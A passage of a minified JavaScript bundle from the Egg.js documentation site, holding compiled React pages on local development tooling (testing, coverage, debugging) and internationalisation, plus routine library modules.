"egg-bin dev --port 7001"\n  }\n}',lang:"json"}),r.a.createElement("h2",{id:"unit-test"},r.a.createElement(l["AnchorLink"],{to:"#unit-test","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Unit Test"),r.a.createElement("p",null,"Here we mainly cover the usage of the tools, for more details about unit tests, please refer to ",r.a.createElement(l["Link"],{to:"./unittest"},"here"),"."),r.a.createElement("h3",{id:"adding-script-1"},r.a.createElement(l["AnchorLink"],{to:"#adding-script-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Adding Script"),r.a.createElement("p",null,"Add ",r.a.createElement("code",null,"npm scripts")," into ",r.a.createElement("code",null,"package.json"),"\uff1a"),r.a.createElement(o["a"],{code:'{\n  "scripts": {\n    "test": "egg-bin test"\n  }\n}',lang:"json"}),r.a.createElement("p",null,"And then we can run unit test by ",r.a.createElement("code",null,"npm test"),"."),r.a.createElement("h3",{id:"environment-configuration-1"},r.a.createElement(l["AnchorLink"],{to:"#environment-configuration-1","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Environment Configuration"),r.a.createElement("p",null,"To run test cases, environment needs to be set as ",r.a.createElement("code",null,"env: unittest"),". The configuration comes from the combination of both ",r.a.createElement("code",null,"config.local.js")," and ",r.a.createElement("code",null,"config.unittest.js"),"."),r.a.createElement("h3",{id:"run-specific-test-file"},r.a.createElement(l["AnchorLink"],{to:"#run-specific-test-file","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Run specific test file"),r.a.createElement("p",null,r.a.createElement("code",null,"npm test")," command will look for all the files ended with ",r.a.createElement("code",null,".test.js")," under test folder (default ",r.a.createElement(l["Link"],{to:"https://www.npmjs.com/package/glob"},"glob")," matching rule is ",r.a.createElement("code",null,"test/**/*.test.js"),")."),r.a.createElement("p",null,"However, we would like to run only the test cases that we are working on sometimes. In this case, we may specify a file in the following way:"),r.a.createElement(o["a"],{code:"$ TESTS=test/x.test.js npm test",lang:"bash"}),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://www.npmjs.com/package/glob"},"glob")," expressions are supported here."),r.a.createElement("h3",{id:"reporter-setting"},r.a.createElement(l["AnchorLink"],{to:"#reporter-setting","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Reporter Setting"),r.a.createElement("p",null,"Mocha supports various reporters. Default reporter is ",r.a.createElement("code",null,"spec"),"."),r.a.createElement("p",null,"Reporter is allowed to be specified mannually via setting TEST_REPORTER as the environment variable. For example, to use ",r.a.createElement("code",null,"dot")," instead:"),r.a.createElement(o["a"],{code:"$ TEST_REPORTER=dot npm test",lang:"bash"}),r.a.createElement("p",null,r.a.createElement("img",{src:"https://cloud.githubusercontent.com/assets/156269/21849809/a6fe6df8-d842-11e6-8507-20da63bc8b62.png",alt:"image"})),r.a.createElement("h3",{id:"timeout-setting"},r.a.createElement(l["AnchorLink"],{to:"#timeout-setting","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Timeout Setting"),r.a.createElement("p",null,"The default timeout is 30 seconds. We may set our own timeout (in milliseconds). For example, setting timeout to 5 seconds:"),r.a.createElement(o["a"],{code:"$ TEST_TIMEOUT=5000 npm test",lang:"bash"}),r.a.createElement("h3",{id:"pass-parameters-via-argv"},r.a.createElement(l["AnchorLink"],{to:"#pass-parameters-via-argv","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Pass Parameters via argv"),r.a.createElement("p",null,"Besides environment variables, ",r.a.createElement("code",null,"egg-bin test")," also supports passing parameters directly, and it supports all mocha parameters. You may refer to ",r.a.createElement(l["Link"],{to:"https://mochajs.org/#usage"},"mocha usage"),"."),r.a.createElement(o["a"],{code:'$ # Passing parameters via npm need to add an extra `--`, according to https://docs.npmjs.com/cli/run-script\n$ npm test -- --help\n$\n$ # Equivalent to `TESTS=test/**/test.js npm test`. Since the limitation of bash, it\'s better to add double qoute to path.\n$ npm test "test/**/test.js"\n$\n$ # Equivalent to `TEST_REPORTER=dot npm test`\n$ npm test -- --reporter=dot\n$\n$ # Parameters of mocha are supported, such as grep, require, etc.\n$ npm test -- -t 30000 --grep="should GET"',lang:"bash"}),r.a.createElement("h2",{id:"code-coverage"},r.a.createElement(l["AnchorLink"],{to:"#code-coverage","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Code Coverage"),r.a.createElement("p",null,"egg-bin has build-in ",r.a.createElement(l["Link"],{to:"https://github.com/istanbuljs/nyc"},"nyc")," to support calculating code coverage report of unit test."),r.a.createElement("p",null,"Add ",r.a.createElement("code",null,"npm scripts")," into ",r.a.createElement("code",null,"package.json"),"\uff1a"),r.a.createElement(o["a"],{code:'{\n  "scripts": {\n    "cov": "egg-bin cov"\n  }\n}',lang:"json"}),r.a.createElement("p",null,"And then we can get code coverage report of unit test via ",r.a.createElement("code",null,"npm run cov"),"."),r.a.createElement(o["a"],{code:"$ egg-bin cov\n\n  test/controller/home.test.js\n    GET /\n      \u2713 should status 200 and get the body\n    POST /post\n      \u2713 should status 200 and get the request body\n\n  ...\n\n  16 passing (1s)\n\n=============================== Coverage summary ===============================\nStatements   : 100% ( 41/41 )\nBranches     : 87.5% ( 7/8 )\nFunctions    : 100% ( 10/10 )\nLines        : 100% ( 41/41 )\n================================================================================",lang:"bash"}),r.a.createElement("p",null,"And we may open HTML file of complete code coverage report via ",r.a.createElement("code",null,"open coverage/lcov-report/index.html"),"."),r.a.createElement("p",null,r.a.createElement("img",{src:"https://cloud.githubusercontent.com/assets/156269/21845201/a9a85ab6-d82c-11e6-8c24-5e85f352be4a.png",alt:"image"})),r.a.createElement("h3",{id:"environment-configuration-2"},r.a.createElement(l["AnchorLink"],{to:"#environment-configuration-2","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Environment Configuration"),r.a.createElement("p",null,"Just like test, the environment needs to be set to ",r.a.createElement("code",null,"env:unittest")," to run cov, and the configuration comes from the combination of both ",r.a.createElement("code",null,"config.local.js")," and ",r.a.createElement("code",null,"config.unittest.js"),"."),r.a.createElement("h3",{id:"ignore-specific-files"},r.a.createElement(l["AnchorLink"],{to:"#ignore-specific-files","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Ignore Specific Files"),r.a.createElement("p",null,"To ignore some files in code coverage rate calculation, You may use ",r.a.createElement("code",null,"COV_EXCLUDES")," as the environment variable to ignore some specific files that don't need the test converages:"),r.a.createElement(o["a"],{code:"$ COV_EXCLUDES=app/plugins/c* npm run cov\n$ # Or pass this setting via parameters\n$ npm run cov -- --x=app/plugins/c*",lang:"bash"}),r.a.createElement("h2",{id:"debugging"},r.a.createElement(l["AnchorLink"],{to:"#debugging","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Debugging"),r.a.createElement("h3",{id:"log-print"},r.a.createElement(l["AnchorLink"],{to:"#log-print","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Log Print"),r.a.createElement("h3",{id:"use-logger-module"},r.a.createElement(l["AnchorLink"],{to:"#use-logger-module","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Use ",r.a.createElement("code",null,"Logger")," Module"),r.a.createElement("p",null,"There's a built-in ",r.a.createElement(l["Link"],{to:"./logger"},"Log")," in the egg, so you may use logger.debug() to print out debug information. ",r.a.createElement("strong",null,"We recommend you use it in your own code.")),r.a.createElement(o["a"],{code:"// controller\nthis.logger.debug('current user: %j', this.user);\n\n// service\nthis.ctx.logger.debug('debug info from service');\n\n// app/init.js\napp.logger.debug('app init');",lang:"js"}),r.a.createElement("p",null,"Levels of logs can be configured via ",r.a.createElement("code",null,"config.logger.level")," for printing into file, and ",r.a.createElement("code",null,"config.logger.consoleLevel")," for printing into console."),r.a.createElement("h3",{id:"use-debug-module"},r.a.createElement(l["AnchorLink"],{to:"#use-debug-module","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Use ",r.a.createElement("code",null,"Debug")," Module"),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://www.npmjs.com/package/debug"},"debug")," module is a debug tool widely adopted in Node.js community, plenty of modules are using it to print debug information. So for the Egg community. ",r.a.createElement("strong",null,"We recommand you use it in your own development of framework and plugins.")),r.a.createElement("p",null,"It's easy for us to watch the whole process of test through ",r.a.createElement("code",null,"DEBUG")," as the environment variable to start with certain code."),r.a.createElement("p",null,'(Do not confuse debug module with logger module, for the latter also has quite a lot of functions, what we mean "log" here is the debug info.)'),r.a.createElement("p",null,"Turn on log of all modules:"),r.a.createElement(o["a"],{code:"$ DEBUG=* npm run dev",lang:"bash"}),r.a.createElement("p",null,"Turn on log of specific module:"),r.a.createElement(o["a"],{code:"$ DEBUG=egg* npm run dev",lang:"bash"}),r.a.createElement("p",null,"Detail logs of unit tests progress are able to be viewed via ",r.a.createElement("code",null,"DEBUG=* npm test"),"."),r.a.createElement("h3",{id:"debug-with-egg-bin"},r.a.createElement(l["AnchorLink"],{to:"#debug-with-egg-bin","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Debug with ",r.a.createElement("code",null,"egg-bin")),r.a.createElement("h4",{id:"adding-script-2"},r.a.createElement(l["AnchorLink"],{to:"#adding-script-2","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Adding Script"),r.a.createElement("p",null,"Add ",r.a.createElement("code",null,"npm scripts")," into ",r.a.createElement("code",null,"package.json"),"\uff1a"),r.a.createElement(o["a"],{code:'{\n  "scripts": {\n    "debug": "egg-bin debug"\n  }\n}',lang:"json"}),r.a.createElement("p",null,"And then we may set breakpoints for debugging our app via ",r.a.createElement("code",null,"npm run debug"),"."),r.a.createElement("p",null,r.a.createElement("code",null,"egg-bin")," will select debug protocol automatically. ",r.a.createElement(l["Link"],{to:"https://chromedevtools.github.io/debugger-protocol-viewer/v8"},"Inspector Protocol")," will be selected for version 8.x and later. For earlier ones, ",r.a.createElement(l["Link"],{to:"https://github.com/buggerjs/bugger-v8-client/blob/master/PROTOCOL.md"},"Legacy Protocol")," is the choice."),r.a.createElement("p",null,"Meanwhile, It also supports customized debug parameters."),r.a.createElement(o["a"],{code:"$ egg-bin debug --inpsect=9229",lang:"bash"}),r.a.createElement("ul",null,r.a.createElement("li",null,"Debug port of ",r.a.createElement("code",null,"master")," is 9229 or 5858 (Legacy Protocol)."),r.a.createElement("li",null,"Debug port of ",r.a.createElement("code",null,"agent")," is fixed to 5800, it is customizable via ",r.a.createElement("code",null,"process.env.EGG_AGENT_DEBUG_PORT"),"."),r.a.createElement("li",null,"Debug port number of ",r.a.createElement("code",null,"worker")," will increase from ",r.a.createElement("code",null,"master")," port number."),r.a.createElement("li",null,'During developing period, worker will "hot restart" once the code is changed, and it will cause the increase of port. Please refer to the following IDE configuration for auto-reconnecting.')),r.a.createElement("h4",{id:"environment-configuration-3"},r.a.createElement(l["AnchorLink"],{to:"#environment-configuration-3","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Environment Configuration"),r.a.createElement("p",null,"App starts by ",r.a.createElement("code",null,"env: local")," when executing debug . The configuration comes from the combination of both ",r.a.createElement("code",null,"config.local.js")," and ",r.a.createElement("code",null,"config.unittest.js"),"."),r.a.createElement("h4",{id:"debug-with-devtools"},r.a.createElement(l["AnchorLink"],{to:"#debug-with-devtools","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Debug with ",r.a.createElement(l["Link"],{to:"https://developer.chrome.com/devtools"},"DevTools")),r.a.createElement("p",null,"The latest DevTools only supports ",r.a.createElement(l["Link"],{to:"https://chromedevtools.github.io/debugger-protocol-viewer/v8"},"Inspector Protocol"),". Thus you will need to install Node.js 8.x or higher verions to be able to use it."),r.a.createElement("p",null,"Execute ",r.a.createElement("code",null,"npm run debug")," to start it:"),r.a.createElement(o["a"],{code:"\u279c  showcase git:(master) \u2717 npm run debug\n\n> showcase@1.0.0 debug /Users/tz/Workspaces/eggjs/test/showcase\n> egg-bin debug\n\nDebugger listening on ws://127.0.0.1:9229/f8258ca6-d5ac-467d-bbb1-03f59bcce85b\nFor help see https://nodejs.org/en/docs/inspector\n2017-09-14 16:01:35,990 INFO 39940 [master] egg version 1.8.0\nDebugger listening on ws://127.0.0.1:5800/bfe1bf6a-2be5-4568-ac7d-69935e0867fa\nFor help see https://nodejs.org/en/docs/inspector\n2017-09-14 16:01:36,432 INFO 39940 [master] agent_worker#1:39941 started (434ms)\nDebugger listening on ws://127.0.0.1:9230/2fcf4208-4571-4968-9da0-0863ab9f98ae\nFor help see https://nodejs.org/en/docs/inspector\n9230 opened\nDebug Proxy online, now you could attach to 9999 without worry about reload.\nDevTools \u2192 chrome-devtools://devtools/bundled/inspector.html?experiments=true&v8only=true&ws=127.0.0.1:9999/__ws_proxy__",lang:"bash"}),r.a.createElement("p",null,"And then choose one of the following ways:"),r.a.createElement("ul",null,r.a.createElement("li",null,"Visit the ",r.a.createElement("code",null,"DevTools")," URL printed in the last few lines in console directly. Since this URL is proxied from worker, you don't need to worry about restarting."),r.a.createElement("li",null,"Open ",r.a.createElement("code",null,"chrome://inspect"),", and config port accordingly, then click ",r.a.createElement("code",null,"Open dedicated DevTools for Node")," to open debug console.")),r.a.createElement("p",null,r.a.createElement("img",{src:"https://user-images.githubusercontent.com/227713/30419047-a54ac592-9967-11e7-8a05-5dbb82088487.png",alt:"DevTools"})),r.a.createElement("h4",{id:"debug-with-webstorm"},r.a.createElement(l["AnchorLink"],{to:"#debug-with-webstorm","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Debug with WebStorm"),r.a.createElement("p",null,r.a.createElement("code",null,"egg-bin")," will read environment variable ",r.a.createElement("code",null,"$NODE_DEBUG_OPTION")," set in WebStorm debug mode."),r.a.createElement("p",null,"Start npm debug in WebStorm\uff1a"),r.a.createElement("p",null,r.a.createElement("img",{src:"https://user-images.githubusercontent.com/227713/30423086-5dd32ac6-9974-11e7-840f-904e49a97694.png",alt:"WebStorm"})),r.a.createElement("h4",{id:"debug-with-vscode"},r.a.createElement(l["AnchorLink"],{to:"#debug-with-vscode","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Debug with ",r.a.createElement(l["Link"],{to:"https://code.visualstudio.com/"},"VSCode")),r.a.createElement("p",null,"There are 2 ways:"),r.a.createElement("p",null,"1st method: open settings in VSCode, turn on ",r.a.createElement("code",null,"Debug: Toggle Auto Attach"),", and then execute ",r.a.createElement("code",null,"npm run debug")," in the terminal."),r.a.createElement("p",null,"2nd method: setup ",r.a.createElement("code",null,".vscode/launch.json")," in VSCode, and then simply start with F5 key. (Note: You have to turn off the settings mentioned in the 1st method before doing it)."),r.a.createElement(o["a"],{code:'// .vscode/launch.json\n{\n  "version": "0.2.0",\n  "configurations": [\n    {\n      "name": "Launch Egg",\n      "type": "node",\n      "request": "launch",\n      "cwd": "${workspaceRoot}",\n      "runtimeExecutable": "npm",\n      "windows": { "runtimeExecutable": "npm.cmd" },\n      "runtimeArgs": [ "run", "debug" ],\n      "console": "integratedTerminal",\n      "protocol": "auto",\n      "restart": true,\n      "port": 9229,\n      "autoAttachChildProcesses": true\n    }\n  ]\n}',lang:"js"}),r.a.createElement("p",null,"And we offer a ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/vscode-eggjs"},"vscode-eggjs")," extention to setup auto-matically."),r.a.createElement("p",null,r.a.createElement("img",{src:"https://user-images.githubusercontent.com/227713/35954428-7f8768ee-0cc4-11e8-90b2-67e623594fa1.png",alt:"VSCode"})),r.a.createElement("p",null,"For more options of setting up debug in VSCode, please refer to ",r.a.createElement(l["Link"],{to:"https://code.visualstudio.com/docs/nodejs/nodejs-debugging"},"Node.js Debugging in VS Code"),"."),r.a.createElement("h2",{id:"more"},r.a.createElement(l["AnchorLink"],{to:"#more","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"More"),r.a.createElement("p",null,"If you would like to know more about local development, like customizing a local development tool for your team, please refer to ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-bin"},"egg-bin"),".")))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},C2xF:function(e,t,n){var a=n("0mt+"),r=n("JH4+");a({target:"Map",stat:!0},{of:r})},C9r0:function(e,t,n){"use strict";function a(){var e=n("FU0I");return a=function(){return e},e}function r(){var e=l(n("Flpl"));return r=function(){return e},e}function l(e){return e&&e.__esModule?e:{default:e}}function o(e,t){return d(e)||u(e,t)||c(e,t)||i()}function i(){throw new TypeError("Invalid attempt to destructure non-iterable instance.\nIn order to be iterable, non-array objects must have a [Symbol.iterator]() method.")}function c(e,t){if(e){if("string"===typeof e)return s(e,t);var n=Object.prototype.toString.call(e).slice(8,-1);return"Object"===n&&e.constructor&&(n=e.constructor.name),"Map"===n||"Set"===n?Array.from(e):"Arguments"===n||/^(?:Ui|I)nt(?:8|16|32)(?:Clamped)?Array$/.test(n)?s(e,t):void 0}}function s(e,t){(null==t||t>e.length)&&(t=e.length);for(var n=0,a=new Array(t);n<t;n++)a[n]=e[n];return a}function u(e,t){var n=null==e?null:"undefined"!=typeof Symbol&&e[Symbol.iterator]||e["@@iterator"];if(null!=n){var a,r,l,o,i=[],c=!0,s=!1;try{if(l=(n=n.call(e)).next,0===t){if(Object(n)!==n)return;c=!1}else for(;!(c=(a=l.call(n)).done)&&(i.push(a.value),i.length!==t);c=!0);}catch(u){s=!0,r=u}finally{try{if(!c&&null!=n["return"]&&(o=n["return"](),Object(o)!==o))return}finally{if(s)throw r}}return i}}function d(e){if(Array.isArray(e))return e}Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=void 0;var m={"zh-CN":"https://www.typescriptlang.org/zh/play","en-US":"https://www.typescriptlang.org/play"},p=function(e,t){var n=function(){var e=/^zh|cn$/.test(arguments.length<=0?void 0:arguments[0])?m["zh-CN"]:m["en-US"];return"".concat(e,"?skipLibCheck=true&jsx=1#code/").concat(r()["default"].compressToEncodedURIComponent(arguments.length<=1?void 0:arguments[1]))},l=(0,a().useState)(n(e,t)),i=o(l,2),c=i[0],s=i[1];return(0,a().useEffect)((function(){s(n(e,t))}),[e,t]),c};t["default"]=p},CPOg:function(e,t,n){"use strict";var a=n("0mt+"),r=n("wpLQ").start,l=n("zCNj");a({target:"String",proto:!0,forced:l},{padStart:function(e){return r(this,e,arguments.length>1?arguments[1]:void 0)}})},CSfq:function(e,t,n){"use strict";var a=n("0mt+"),r=n("m4/z"),l=n("V3tB"),o=n("oyD1"),i=n("XaNN"),c=n("G9w8"),s=n("j9ts"),u=n("BZjo"),d=n("NBU9");a({target:"Set",proto:!0,real:!0,forced:r},{filter:function(e){var t=o(this),n=u(t),a=c(e,arguments.length>1?arguments[1]:void 0,3),r=new(s(t,l("Set"))),m=i(r.add);return d(n,(function(e){a(e,e,t)&&m.call(r,e)}),void 0,!1,!0),r}})},CUYM:function(e,t,n){"use strict";var a=n("FU0I"),r=Object(a["createContext"])({});t["a"]=r},CcMK:function(e,t,n){"use strict";e.exports=function(e,t){if("string"!==typeof e||"string"!==typeof t)throw new TypeError("Expected the arguments to be of type `string`");if(""===t)return[e];var n=e.indexOf(t);return-1===n?[e]:[e.slice(0,n),e.slice(n+t.length)]}},Cplx:function(e,t,n){"use strict";var a=n("0mt+"),r=n("m4/z"),l=n("oyD1"),o=n("G9w8"),i=n("AOzO"),c=n("NBU9");a({target:"Map",proto:!0,real:!0,forced:r},{every:function(e){var t=l(this),n=i(t),a=o(e,arguments.length>1?arguments[1]:void 0,3);return!c(n,(function(e,n){if(!a(n,e,t))return c.stop()}),void 0,!0,!0).stopped}})},CpnO:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"For developing the multi-language application, build-in I18n support by ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-i18n"},"egg-i18n")," plugin"),r.a.createElement("h2",{id:"default-language"},r.a.createElement(l["AnchorLink"],{to:"#default-language","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Default Language"),r.a.createElement("p",null,"Default ",r.a.createElement("code",null,"en-US"),". Assume that we want to switch the default language to Simplified Chinese\uff1a"),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.i18n = {\n  defaultLocale: 'zh-CN',\n};",lang:"js"}),r.a.createElement("h2",{id:"switch-language"},r.a.createElement(l["AnchorLink"],{to:"#switch-language","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Switch Language"),r.a.createElement("p",null,"Here we have some ways to switch the application's current language (Modified records will set to the cookie ",r.a.createElement("code",null,"locale"),"), the next request will use the language setting directly."),r.a.createElement("p",null,"Priority from high to low:"),r.a.createElement("ol",null,r.a.createElement("li",null,"query: ",r.a.createElement("code",null,"/?locale=en-US")),r.a.createElement("li",null,"cookie: ",r.a.createElement("code",null,"locale=zh-TW")),r.a.createElement("li",null,"header: ",r.a.createElement("code",null,"Accept-Language: zh-CN,zh;q=0.5"))),r.a.createElement("p",null,"If want to modify parameter name of query or cookie"),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.i18n = {\n  queryField: 'locale',\n  cookieField: 'locale',\n  // Cookie default expired after one year, the unit is ms if set as Number\n  cookieMaxAge: '1y',\n};",lang:"js"}),r.a.createElement("h2",{id:"writing-i18n-multi-language-documents"},r.a.createElement(l["AnchorLink"],{to:"#writing-i18n-multi-language-documents","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Writing I18n Multi-language Documents"),r.a.createElement("p",null,"Configuration of multi-language are independent, stored in ",r.a.createElement("code",null,"config/locale/*.js")),r.a.createElement(o["a"],{code:"- config/locale/\n  - en-US.js\n  - zh-CN.js\n  - zh-TW.js",lang:"unknown"}),r.a.createElement("p",null,"Not only take effects in the application directory, but also in the directory of framework or plugin ",r.a.createElement("code",null,"config/locale")),r.a.createElement("p",null,r.a.createElement("strong",null,"Note: It's locale, not locals.")),r.a.createElement("p",null,"Example:"),r.a.createElement(o["a"],{code:"// config/locale/zh-CN.js\nmodule.exports = {\n  Email: '\u90ae\u7bb1',\n};",lang:"js"}),r.a.createElement("p",null,"Or using JSON file:"),r.a.createElement(o["a"],{code:'// config/locale/zh-CN.json\n{\n  "Email": "\u90ae\u7bb1"\n}',lang:"json"}),r.a.createElement("h2",{id:"getting-multi-language-texts"},r.a.createElement(l["AnchorLink"],{to:"#getting-multi-language-texts","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Getting Multi-language Texts"),r.a.createElement("p",null,"Use ",r.a.createElement("code",null,"__")," (Alias: ",r.a.createElement("code",null,"gettext"),") function to get the multi-language texts under locale directory"),r.a.createElement("p",null,"**Note: ",r.a.createElement("code",null,"**")," is two underscores__"),r.a.createElement("p",null,"Take above multi-language configuration as example:"),r.a.createElement(o["a"],{code:"ctx.__('Email');\n// zh-CN => \u90ae\u7bb1\n// en-US => Email",lang:"js"}),r.a.createElement("p",null,"If texts contain format function like ",r.a.createElement("code",null,"%s"),"\uff0c",r.a.createElement("code",null,"%j"),", we can call by the way similar to ",r.a.createElement(l["Link"],{to:"https://nodejs.org/api/util.html#util_util_format_format_args"},r.a.createElement("code",null,"util.format()"))),r.a.createElement(o["a"],{code:"// config/locale/zh-CN.js\nmodule.exports = {\n  'Welcome back, %s!': '\u6b22\u8fce\u56de\u6765\uff0c%s!',\n};\n\nctx.__('Welcome back, %s!', 'Shawn');\n// zh-CN => \u6b22\u8fce\u56de\u6765\uff0cShawn!\n// en-US => Welcome back, Shawn!",lang:"js"}),r.a.createElement("p",null,"Support array, subscript and placeholder, such as"),r.a.createElement(o["a"],{code:"// config/locale/zh-CN.js\nmodule.exports = {\n  'Hello {0}! My name is {1}.': '\u4f60\u597d {0}! \u6211\u7684\u540d\u5b57\u53eb {1}\u3002',\n};\n\nctx.__('Hello {0}! My name is {1}.', ['foo', 'bar']);\n// zh-CN => \u4f60\u597d foo\uff01\u6211\u7684\u540d\u5b57\u53eb bar\u3002\n// en-US => Hello foo! My name is bar.",lang:"js"}),r.a.createElement("h3",{id:"use-in-controller"},r.a.createElement(l["AnchorLink"],{to:"#use-in-controller","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Use in Controller"),r.a.createElement(o["a"],{code:"class HomeController extends Controller {\n  async index() {\n    const ctx = this.ctx;\n    ctx.body = {\n      message: ctx.__('Welcome back, %s!', ctx.user.name)\n      // or use gettext, it is a alias of __ function\n      // message: ctx.gettext('Welcome back', ctx.user.name)\n      user: ctx.user,\n    };\n  }\n}",lang:"js"}),r.a.createElement("h3",{id:"use-in-view"},r.a.createElement(l["AnchorLink"],{to:"#use-in-view","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Use in View"),r.a.createElement("p",null,"Assume we are using template engine ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view-nunjucks"},"Nunjucks")),r.a.createElement(o["a"],{code:"<li>{{ __('Email') }}: {{ user.email }}</li>\n<li>{{ __('Welcome back, %s!', user.name) }}</li>\n<li>{{ __('Hello {0}! My name is {1}.', ['foo', 'bar']) }}</li>",lang:"html"})))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},Cs1J:function(e,t,n){var a=n("65ru"),r=n("09W1"),l=n("Z//x"),o=NaN,i=/^[-+]0x[0-9a-f]+$/i,c=/^0b[01]+$/i,s=/^0o[0-7]+$/i,u=parseInt;function d(e){if("number"==typeof e)return e;if(l(e))return o;if(r(e)){var t="function"==typeof e.valueOf?e.valueOf():e;e=r(t)?t+"":t}if("string"!=typeof e)return 0===e?e:+e;e=a(e);var n=c.test(e);return n||s.test(e)?u(e.slice(2),n?2:8):i.test(e)?o:+e}e.exports=d},CwJZ:function(e,t){(function(t){e.exports=function(){var e={873:function(e){var t;t=function(){return this}();try{t=t||new Function("return this")()}catch(n){"object"===typeof window&&(t=window)}e.exports=t}},n={};function a(t){if(n[t])return n[t].exports;var r=n[t]={exports:{}},l=!0;try{e[t](r,r.exports,a),l=!1}finally{l&&delete n[t]}return r.exports}return a.ab=t+"/",a(873)}()}).call(this,"/")},D7X3:function(e,t,n){"use strict";function a(){var e=r(n("FU0I"));return a=function(){return e},e}function r(e){return e&&e.__esModule?e:{default:e}}Object.defineProperty(t,"__esModule",{value:!0}),t["default"]=void 0;var l=a()["default"].createContext({config:{mode:"doc",title:"",navs:{},menus:{},locales:[],repository:{branch:"master"},theme:{}},meta:{title:""},menu:[],nav:[],base:"",routes:[],apis:{},demos:{}});t["default"]=l},D97U:function(e,t,n){"use strict";var a=n("2EJr"),r=n("3Qq0"),l=n("qPib"),o=n("0YMn"),i=n("EJBU"),c=n("FU0I"),s=n("VGn1"),u=n.n(s),d=n("0kLB"),m=c["forwardRef"]((function(e,t){var n=e.height,o=e.offset,i=e.children,s=e.prefixCls,m=e.onInnerResize,p=e.innerProps,h={},g={display:"flex",flexDirection:"column"};return void 0!==o&&(h={height:n,position:"relative",overflow:"hidden"},g=Object(r["a"])(Object(r["a"])({},g),{},{transform:"translateY(".concat(o,"px)"),position:"absolute",left:0,right:0,top:0})),c["createElement"]("div",{style:h},c["createElement"](d["a"],{onResize:function(e){var t=e.offsetHeight;t&&m&&m()}},c["createElement"]("div",Object(a["a"])({style:g,className:u()(Object(l["a"])({},"".concat(s,"-holder-inner"),s)),ref:t},p),i)))}));m.displayName="Filler";var p=m,h=n("E3E7"),g=n("+g4N"),f=n("zraO"),E=n("+ujd"),b=n("WeeI"),v=20;function y(e){return"touches"in e?e.touches[0].pageY:e.pageY}var k=function(e){Object(f["a"])(n,e);var t=Object(E["a"])(n);function n(){var e;Object(h["a"])(this,n);for(var a=arguments.length,r=new Array(a),l=0;l<a;l++)r[l]=arguments[l];return e=t.call.apply(t,[this].concat(r)),e.moveRaf=null,e.scrollbarRef=c["createRef"](),e.thumbRef=c["createRef"](),e.visibleTimeout=null,e.state={dragging:!1,pageY:null,startTop:null,visible:!1},e.delayHidden=function(){clearTimeout(e.visibleTimeout),e.setState({visible:!0}),e.visibleTimeout=setTimeout((function(){e.setState({visible:!1})}),2e3)},e.onScrollbarTouchStart=function(e){e.preventDefault()},e.onContainerMouseDown=function(e){e.stopPropagation(),e.preventDefault()},e.patchEvents=function(){window.addEventListener("mousemove",e.onMouseMove),window.addEventListener("mouseup",e.onMouseUp),e.thumbRef.current.addEventListener("touchmove",e.onMouseMove),e.thumbRef.current.addEventListener("touchend",e.onMouseUp)},e.removeEvents=function(){var t;window.removeEventListener("mousemove",e.onMouseMove),window.removeEventListener("mouseup",e.onMouseUp),null===(t=e.scrollbarRef.current)||void 